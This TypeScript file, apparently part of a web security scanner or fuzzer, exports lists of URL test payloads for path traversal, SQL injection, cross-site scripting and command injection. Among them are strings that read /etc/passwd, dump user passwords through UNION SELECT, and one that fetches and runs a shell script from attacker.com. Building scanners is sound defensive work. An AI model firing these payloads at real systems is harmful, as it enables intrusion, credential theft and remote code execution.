export const urlPayloads: Record<string, string[]> = {
  lfi: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '../../../../../../etc/passwd%00',
    'php://filter/convert.base64-encode/resource=index.php',
  ],
  sqli: [
    "1' OR '1'='1",
    "1' OR 1=1--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=2 UNION SELECT username,password FROM users--",
    "' OR 'x'='x",
  ],
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
  ],
  rce: [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(cat /etc/passwd)',
    '; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh',
  ],
}
